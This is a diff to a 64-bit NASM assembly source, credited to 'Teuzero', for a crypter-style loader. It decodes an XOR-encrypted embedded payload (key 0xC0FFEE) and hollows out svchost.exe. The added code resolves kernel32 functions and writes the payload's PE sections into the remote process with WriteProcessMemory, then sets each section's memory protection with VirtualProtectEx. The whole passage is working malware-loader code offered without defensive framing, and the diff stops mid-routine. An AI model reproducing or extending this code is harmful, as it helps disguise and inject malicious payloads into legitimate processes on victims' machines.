@@ -1,11 +1,14 @@
 [BITS 64]
+;**************
+;* By:Teuzero *
+;**************
 global WinMain
 
 section .BSS
 	process db "svchost.exe",0,0
 	
 section .data	
-	
+
     struc CONTEXT
        .P1Home:                                      resq 1
        .P2Home:                                      resq 1
@@ -45,7 +48,6 @@ section .data
        .R14:                                         resq 1
        .R15:                                         resq 1
        .Rip:                                         resq 1
-	   
     endstruc
 	
     ctx istruc CONTEXT 
@@ -87,7 +89,7 @@ section .data
        at CONTEXT.R14,                               dq 0
        at CONTEXT.R15,                               dq 0
        at CONTEXT.Rip,                               dq 0
-    iend
+	iend
 	
     
    struc PROCESSINFO
@@ -178,10 +180,11 @@ section .data
     vUnk times 8                                     dq 0
     zero times 8                                     dq 0
     address750 times 8                               dq 0
-	
-    jmpDelta db 0
+	pt20 dq 20
     Ptrt0 dq 0x00
-
+	ptr17f0 dd 0x01
+	address7ec dd 0
+	Ptrl dq  0x0004000000000000
 section .codered
 	CodeRed:
 	Buffer2 times 800000                         db 0
@@ -263,6 +266,7 @@ section .deccode
 	
 	mov rax, CodeRed
 	xor rcx,rcx
+	mov r9, [TamArqTarget]
 	DecArq:
 		mov rdx, [rax]
 		xor rdx, 0xC0FFEE
@@ -270,7 +274,7 @@ section .deccode
 		inc rbx
 		inc rax
 		inc RCX
-		cmp rcx, 0xC3500
+		cmp rcx, r9
 		jne DecArq
 		
 	mov rcx, rdi
@@ -303,7 +307,7 @@ section .deccode
 	call GetThreadCx
 	
 	;call GetThreadContext
-	mov [ctx+CONTEXT.ContextFlags], dword 0x100002
+	mov dword[ctx+CONTEXT.ContextFlags], 0x100002 
 	mov rax, [ProcInfo+PROCESSINFO.hThread]
 	lea rdx, [ctx+CONTEXT.P1Home]
 	mov rcx, rax
@@ -446,7 +450,6 @@ section .deccode
 			;Guarda offset PE
 			mov rax,  [PE]
 			mov eax, dword[rax+0x28]
-			xor rdx,Rdx
 			mov edx,eax
 			mov rax, [ImageBase]
 			add rax,rdx
@@ -521,29 +524,226 @@ section .deccode
 			mov rax, [lpImageBase]
 			mov eax, [rax+0x3c]
 			movsxd rdx,eax
-			mov rax, [lpPebImageBase]
+			mov rax, [lpImageBase]
 			add rax,Rdx
 			add rax, 0x108
 			mov [address750], rax
 			mov [zero], dword 0x00
 			jmp Final
+		
 		Delta:
-		
+			call Locate_kernel32
+			;Lookup WriteProcess
+			call WriteProcess
+			mov eax,[zero]
+			movsxd rdx,eax
+			mov rax, RDX
+			shl rax,0x2
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx, Rax
+			mov rax, [address750]
+			add rax, Rdx
+			mov eax, dword[rax+0x10]
+			mov r9d,eax
+			mov eax, dword [zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax,0x2
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax,Rdx
+			mov eax, dword[rax+0x14]
+			mov edx,eax
+			mov rax, [lpImageBase]
+			add rax,Rdx
+			mov r8, Rax
+			mov eax, dword[zero]
+			movsxd rdx, eax
+			mov rax, Rdx
+			shl rax, 0x2
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax,Rdx
+			mov eax, dword[rax+0xc]
+			mov edx,eax
+			mov rax, [ImageBase]
+			add rax,Rdx
+			mov rcx,Rax
+			mov rax, [ProcInfo+PROCESSINFO.hProcess]
+			lea rdx, [Ptrl]
+			mov [rsp+0x20],rdx
+			mov rdx,Rcx
+			mov rcx, Rax
+			call R12
+			mov dword[ptr17f0], 0
+			mov rax, [PE]
+			movzx eax, word[rax+0x6]
+			movzx eax, ax
+			sub eax, 0x01
+			cmp eax, [zero]
+			
+			jne Decisao2
+			mov rax, [PE]
+			mov ecx, [rax+0x50]
+			mov eax, dword[zero]
+			movsxd rdx,eax
+			mov rax,rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx, Rax
+			mov rax, [address750]
+			add rax,Rdx
+			mov eax, dword [rax+0xc]
+			sub ecx,eax
+			mov eax,ecx
+			mov dword[zero], eax
+			jmp D4
+		Decisao2:
+			mov eax, dword[zero]
+			cdqe
+			lea rdx, [rax+1]
+			mov rax,Rdx
+			shl rax,0x02
+			add rax,Rdx
+			mov rax, [address750]
+			add rax,Rdx
+			mov ecx, dword [rax+0xC]
+			mov eax, dword[zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax,0x03
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax,Rdx
+			mov eax, dword[rax+0xc]
+			sub ecx,eax
+			mov eax, ecx
+			mov dword[ptr17f0], eax
+			
+		D4:
+			mov dword[address7ec], 0
+			mov eax, dword[zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax, Rdx
+			mov eax, dword[rax+0x24]
+			and eax,  0x20000000
+			test eax, eax 
+			je D5
+			
+			mov eax, [zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax,0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax,rdx
+			mov eax, dword[rax+0x24]
+			and eax , 0x40000000
+			test eax,eax
+			je D5
+			
+			mov eax, dword[zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax,Rdx
+			mov eax, dword[rax+0x24]
+			test eax,eax
+			jns D5
+			mov dword[address7ec],0x40
+			jmp jmpAlloc
+		D5:
+			mov eax, dword[zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax, Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax,Rdx
+			mov eax, dword[rax+0x24]
+			and eax, 0x20000000
+			test eax,eax
+			
+			je D6
+			mov eax, dword[zero]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [address750]
+			add rax, Rdx
+			mov eax, dword[rax+0x24]
+			and eax, 0x40000000
+			
+			test eax,eax
+			je D6
+			mov dword[address7ec],0x20
+			jmp jmpAlloc
+		D6:
 		
 			
 			
-			
-			
-		mov rax, [PE] 
-		movzx ex, word [rax+0x06]
-		movzx eax, ax
-		cmp eax, [zero]
-		jg Delta
-		
-		
+		jmpAlloc:	
 		call Locate_kernel32
+		;Lookup VirtualProectEx
 		call VirtualProectEx
+		mov ecx, dword[ptr17f0]
+		mov eax, dword[zero]
+		movsxd rdx,eax
+		mov rax,Rdx
+		shl rax, 0x2
+		add rax,Rdx
+		shl rax,0x3
+		mov rdx,Rax
+		mov rax, [address750]
+		add rax, Rdx
+		mov eax, dword [rax+0xc]
+		mov edx,eax
+		mov rax, [ImageBase]
+		add rax,Rdx
+		mov r10,Rax
+		mov rax, [ProcInfo+PROCESSINFO.hProcess]
+		mov r8d, dword[address7ec]
+		push rbx
+		mov rbx,rsp
+		mov [rsp+0x20],rbx
+		mov r9d, r8d
+		mov r8, Rcx
+		mov rdx,r10
+		mov rcx, Rax
+		call r12
+		add dword [zero], 0x1
 		
+	Final:
+		mov rax, [PE]
+		movzx eax, word[rax+0x06]
+		movzx eax, ax
+		cmp eax, [zero]	
+		jg Delta
 			
 		call Locate_kernel32 
 		mov rax, "read"
